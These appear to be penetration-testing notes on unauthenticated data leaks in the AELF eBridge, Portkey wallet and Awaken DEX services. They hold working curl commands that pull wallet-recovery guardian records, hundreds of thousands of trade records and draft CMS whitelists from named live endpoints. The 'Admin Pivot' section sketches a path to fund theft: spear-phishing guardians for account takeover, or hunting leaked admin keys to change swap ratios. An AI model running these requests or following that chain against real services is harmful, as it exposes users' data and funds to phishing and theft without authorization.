# AELF eBridge Info-Leak Trio — 2026-08-15

Proven live anon leaks that are HYGIENE HIGH, not PROVEN fund theft pre-auth.

## 1. Portkey AA Wallet — 10k KTP (HIGH privacy)

**Endpoint:** `GET https://aa-portkey.portkey.finance/api/app/search/accountrecoverindex?SkipCount=0&MaxResultCount=1`

**Evidence (curl):**
```bash
curl -sk "https://aa-portkey.portkey.finance/api/app/search/accountrecoverindex?SkipCount=0&MaxResultCount=1"
# -> {"totalCount":10000,"items":[{"caHash":"f85aa53dc452f17c3916c8b706af33a688b475f85fe7ac1eeea42924c2095e7c","caAddress":"h2w4ZHJNGF...","managerInfo":{"address":"2Hjp74HE3...","extraData":"{\"transactionTime\":1706679157466,\"deviceInfo\":\"{\\\"deviceName\\\":\\\"macOS\\\",\\\"deviceType\\\":1}\",\"version\":\"2.0.0\"}"},"guardianApproved":[{"identifierHash":"80a1135b01769d0a...","type":2,"verificationInfo":{"id":"58355c3f646d...","verificationDoc":"2,80a1135b...,2024/01/31 05:32:15.734,oeioQ3rzUm...","signature":"2c67f6ca29..."}}]}]}
```

**Leaked fields per record:**
- `caHash`, `caAddress`
- `managerInfo.address` + `extraData` JSON: `deviceName`, `deviceType`, `transactionTime`, `version`
- `guardianApproved[]`: `identifierHash`, `type`, `verificationInfo.id`, `verificationDoc`, `signature`

**Why not fund theft:** Need `RampContract` key for `ForwardMessage` (BridgeContract_Ramp.cs:41 `Assert(Sender==RampContract)`) + `ReceiptHashRecordStatus` dedup (Ramp.cs:85) + `Ledger[swapId][receiptId]` Already claimed (Helpers.cs:110). Leak is recon for spear-phish guardian → `recaptchatoken` + `acToken` → recovery, not direct mint.

**API note:** `/api/abp/api-definition` says `allowAnonymous: None` but anon succeeds — ABP default anonymous.

## 2. Awaken DEX — 498k trades (whale targeting)

**Endpoints:**
```bash
curl -sk "https://app.awaken.finance/api/app/trade-records?ChainId=tDVV&SkipCount=0&MaxResultCount=1"
# -> {"code":"20000","data":{"totalCount":498369,"items":[{"chainId":"tDVV","address":"2X5be...","price":0.058839,"totalPriceInUsd":6.87,"token0Amount":"117",...}]}}
curl -sk "https://app.awaken.finance/api/app/trade-pairs?ChainId=tDVV" # 48 pairs
curl -sk "https://app.awaken.finance/api/app/token/price?ChainId=tDVV&Symbol=ELF" # 0.055
```

**Note:** `tDVV` is sidechain, not testnet. `ChainId=AELF` has 0 pairs — Awaken lives on tDVV.

## 3. CMS Awaken — draft + whitelist (MEDIUM)

**Endpoint:** Directus `x-powered-by: Directus` at `cms-v2.awaken.finance`

```bash
curl -sk -X POST "https://cms-v2.awaken.finance/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ activityList(filter:{status:{_eq:\"draft\"}}){ id status pageId whitelist } }"}'
# -> {"data":{"activityList":[{"id":"4","status":"draft","pageId":"1e51907d...","whitelist":["ELF_2n16rWdAffM...","ELF_2jMsLU2..."]}]}}

# Write blocked:
curl -sk -X POST "https://cms-v2.awaken.finance/items/activityList" -H "Content-Type: application/json" -d '{"pageId":"test"}'
# -> {"code":"FORBIDDEN"}
```

**Introspection alive:** `mutationType: null` (read-only), but anon READ leaks `draft` + `isDev`.

## Admin Pivot (only path to fund theft)

When 0 PROVEN fund theft pre-auth (replay blocked, ToInt64 throws, limit frozen), pivot:

1. Chain status live check:
```bash
curl -sk https://aelf-public-node.aelf.io/api/blockChain/chainStatus | head -c 400
curl -sk https://tdvv-public-node.aelf.io/api/blockChain/chainStatus | head -c 400
# AELF 3504xxxx, tDVV 3336xxxx, GenesisContractAddress present
curl -sk https://aelf-public-node.aelf.io/swagger/v1/swagger.json # 27 paths
```

2. Need BridgeContract address (not system contract). Try:
```bash
curl -sk https://aelf-public-node.aelf.io/api/blockChain/chainStatus
# then via contractView: GetContractAddressByName not public; need explorer XHR or deployment repo
grep -R "Admin\|192.168" /tmp/bridge_unzipped --include="*.json" --include="*.cs"
# appsettings internal 192.168.67.*:8000 unreachable publicly
```

3. Git zip has no `.git` (extracted via tarball bypass for TencentOS). Need re-clone with git history to hunt key leak via `git log -p | grep -i private`.

**Chain:** `info leak (10k KTP) -> spear-phish guardian -> recovery takeover -> fund theft` OR `Admin key leak -> ChangeSwapRatio/SetCrossChainConfig -> instant theft (2M ELF)`. Honest classification required.
